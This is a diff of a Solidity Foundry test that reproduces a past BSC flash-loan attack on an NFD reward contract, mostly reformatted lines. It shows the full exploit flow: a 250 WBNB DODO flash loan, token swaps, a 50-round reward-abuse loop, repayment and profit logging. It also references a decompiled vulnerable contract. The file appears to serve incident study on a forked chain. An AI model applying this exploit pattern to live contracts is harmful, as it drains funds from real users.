@@ -34,7 +34,7 @@ contract Attacker is Test {
     address constant nfd = 0x38C63A5D3f206314107A7a9FE8cBBa29D629D4F9;
 
     function setUp() public {
-        cheat.createSelectFork("bsc", 21140434);
+        cheat.createSelectFork("bsc", 21_140_434);
         console.log("---------- Reproduce Attack Tx1 ----------");
         cheat.label(address(PancakeRouter), "PancakeRouter");
         cheat.label(vulnContract, "vulnContractName");
@@ -42,18 +42,17 @@ contract Attacker is Test {
         cheat.label(dodo, "DODO");
         cheat.label(usdt, "USDT");
         cheat.label(nfd, "NFD");
-
     }
 
     function testExploit() public {
         console.log("Flashloan 250 WBNB from DODO DLP...");
-        bytes memory data = abi.encode(dodo, wbnb, 250*1e18);  
-        DVM(dodo).flashLoan(0, 250*1e18, address(this), data);
+        bytes memory data = abi.encode(dodo, wbnb, 250 * 1e18);
+        DVM(dodo).flashLoan(0, 250 * 1e18, address(this), data);
     }
 
     function DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
         require(IERC20(wbnb).balanceOf(address(this)) == quoteAmount, "Invalid WBNB amount");
-        require(quoteAmount == 250*1e18, "Invalid WBNB amount");
+        require(quoteAmount == 250 * 1e18, "Invalid WBNB amount");
 
         console.log("Swap 250 WBNB to NFD...");
         address[] memory path = new address[](3);
@@ -61,12 +60,14 @@ contract Attacker is Test {
         path[1] = usdt;
         path[2] = nfd;
         IERC20(wbnb).approve(address(PancakeRouter), type(uint256).max);
-        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(quoteAmount, 0, path, address(this), block.timestamp);
+        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            quoteAmount, 0, path, address(this), block.timestamp
+        );
 
         emit log_named_decimal_uint("[*] NFD balance before attack", IERC20(nfd).balanceOf(address(this)), 18);
-        
+
         console.log("Abuse the Reward Contract...");
-        for(uint8 i; i < 50; i++){
+        for (uint8 i; i < 50; i++) {
             Exploit exploit = new Exploit();
             uint256 nfdAmount = IERC20(nfd).balanceOf(address(this));
             IERC20(nfd).transfer(address(exploit), nfdAmount);
@@ -74,17 +75,19 @@ contract Attacker is Test {
         }
 
         emit log_named_decimal_uint("[*] NFD balance after attack", IERC20(nfd).balanceOf(address(this)), 18);
-        
+
         console.log("Swap the profit...");
         uint256 nfdBalance = IERC20(nfd).balanceOf(address(this));
         path[0] = nfd;
         path[1] = usdt;
         path[2] = wbnb;
         IERC20(nfd).approve(address(PancakeRouter), type(uint256).max);
-        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(nfdBalance, 0, path, address(this), block.timestamp);
+        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            nfdBalance, 0, path, address(this), block.timestamp
+        );
 
         console.log("Repay the flashloan...");
-        IERC20(wbnb).transfer(msg.sender, 250*1e18);
+        IERC20(wbnb).transfer(msg.sender, 250 * 1e18);
 
         emit log_named_decimal_uint("Attacker's Net Profit", IERC20(wbnb).balanceOf(address(this)), 18);
     }
@@ -102,8 +105,9 @@ contract Exploit is Test {
     }
 }
 
+/* -------------------- Decompiled Vulnerable Contract 0x8b068e22e9a4a9bca3c321e0ec428abf32691d1e -------------------- */
 
-/* -------------------- Decompiled Vulnerable Contract 0x8b068e22e9a4a9bca3c321e0ec428abf32691d1e -------------------- */ /*
+/*
 
 // Data structures and variables inferred from the use of storage instructions
 uint256 stor_4; // STORAGE[0x4]
@@ -565,5 +569,4 @@ function __function_selector__(bytes4 function_selector) public payable {
     }
     revert();
 }
-
 */
